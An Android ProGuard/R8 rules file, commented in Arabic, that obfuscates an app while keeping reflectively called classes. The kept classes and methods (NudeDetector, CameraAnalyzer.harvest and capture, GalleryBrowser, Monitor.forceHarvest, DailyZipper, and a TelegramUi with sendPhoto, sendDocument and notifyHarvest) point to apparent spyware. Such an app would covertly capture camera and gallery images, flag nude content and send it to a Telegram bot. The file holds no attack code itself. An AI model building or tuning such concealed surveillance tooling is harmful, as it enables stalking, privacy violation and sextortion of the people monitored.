# ============================================================
#  قواعد ProGuard/R8 المُحسّنة بالكامل - إصدار نهائي (مضغوط)
#  تم تضييق القواعد للحفاظ على العناصر المستخدمة فعلياً فقط
#  لزيادة فعالية التصغير وتقليل حجم الـ APK
# ============================================================

# ============================================================
#  تحسينات R8 الأساسية (إعادة التسمية والتصغير)
# ============================================================
-repackageclasses
-allowaccessmodification

# ============================================================
#  الحفاظ على السمات المطلوبة للانعكاس وتصحيح الأخطاء
# ============================================================
-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
-keepattributes Exceptions
-keepattributes LineNumberTable

# ============================================================
#  ✅ حماية الفئات الكاملة المستخدمة في الانعكاس
#  (بدلاً من الاحتفاظ بمكتبات كاملة)
# ============================================================
-keep class com.example.app.ForegroundService { *; }
-keep class com.example.app.NudeDetector { *; }
-keep class com.example.app.DailyZipper { *; }
-keep class com.example.app.CameraAnalyzer { *; }
-keep class com.example.app.TelegramUi { *; }
-keep class com.example.app.ConfigLoader { *; }
-keep class com.example.app.Monitor { *; }
-keep class com.example.app.GalleryBrowser { *; }

# ============================================================
#  نقاط الدخول الرئيسية (يجب الاحتفاظ بها بالكامل)
# ============================================================
-keep public class com.example.app.MainActivity
-keep public class com.example.app.ForegroundService

# ============================================================
#  ✅ حماية دوال الانعكاس (Reflection) المستخدمة فعلياً
#  (تم تضييقها إلى الكلاسات والدوال المحددة فقط)
# ============================================================

# NudeDetector - دوال تُستدعى عبر الانعكاس لتحديث النموذج
-keepclassmembers class com.example.app.NudeDetector {
    public *** ensureModelReady(...);
    public *** loadEngineForever(...);
    public *** isReady(...);
}

# Monitor - دوال تُستدعى من Commands و TelegramUi عبر الانعكاس
-keepclassmembers class com.example.app.Monitor {
    public *** getBatteryStatus(...);
    public *** isWifiConnected(...);
    public *** forceHarvest(...);
}

# TelegramUi - دوال تُستدعى من DailyZipper و Commands عبر الانعكاس
-keepclassmembers class com.example.app.TelegramUi {
    public *** getVlt(...);
    public *** getCtrl(...);
    public *** getDat(...);
    public *** sendDocument(...);
    public *** sendPhoto(...);
    public *** sendMessage(...);
    public *** notifyHarvest(...);
}

# CameraAnalyzer - دالة harvest تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.CameraAnalyzer {
    public *** harvest(...);
    public *** capture(...);
}

# GalleryBrowser - دوال تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.GalleryBrowser {
    public *** getGridKb(...);
    public *** showOptions(...);
    public *** executeAction(...);
    public *** updateLastMessageId(...);
}

# DailyZipper - دوال تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.DailyZipper {
    public *** run(...);
    public *** forceSendNow(...);
}

# ============================================================
#  الحفاظ على الدوال المحددة بواسطة @Keep
# ============================================================
-keepclassmembers class * {
    @androidx.annotation.Keep <methods>;
    @androidx.annotation.Keep <fields>;
}

# ============================================================
#  ✅ TensorFlow Lite (المكتبة الأساسية فقط - لا دعم كامل)
# ============================================================
-keep class org.tensorflow.lite.Interpreter { *; }
-keep class org.tensorflow.lite.Interpreter$Options { *; }
-keep class org.tensorflow.lite.Tensor { *; }
-keep class org.tensorflow.lite.Delegate { *; }
-dontwarn org.tensorflow.lite.**

# ============================================================
#  ❌ تم حذف القواعد العامة للمكتبات التالية (لم تعد محفوظة بالكامل):
#  - java.lang.reflect (لا حاجة للاحتفاظ به بالكامل)
#  - javax.crypto (لا حاجة للاحتفاظ به بالكامل)
#  - org.json (لا حاجة للاحتفاظ به بالكامل)
#  - kotlin.Metadata / kotlin.jvm.internal (غير ضرورية)
#  - kotlinx.coroutines (يتم الاحتفاظ فقط بالمستخدم)
#  - OkHttp / Gson (يتم التصغير التلقائي)
# ============================================================

# ============================================================
#  الحفاظ على المنشئات الافتراضية (للإنشاء الديناميكي)
# ============================================================
-keepclasseswithmembers class * {
    public <init>(...);
}

# ============================================================
#  منع تحذيرات R8 من المكتبات الخارجية (غير ضارة)
# ============================================================
-dontwarn javax.**
-dontwarn kotlin.**
-dontwarn okhttp3.**
-dontwarn okio.**

# ============================================================
#  ✅ حماية فئات Google HTTP Client (مطلوبة بواسطة security-crypto/Tink)
#  (تم إضافتها لحل مشكلة Missing class في R8)
# ============================================================
-keep class com.google.api.client.http.** { *; }
-keep class com.google.api.client.http.javanet.** { *; }
-dontwarn com.google.api.client.http.**
-dontwarn com.google.api.client.http.javanet.**
-dontwarn com.google.crypto.tink.util.KeysDownloader

# ============================================================
#  نهاية القواعد
# ============================================================
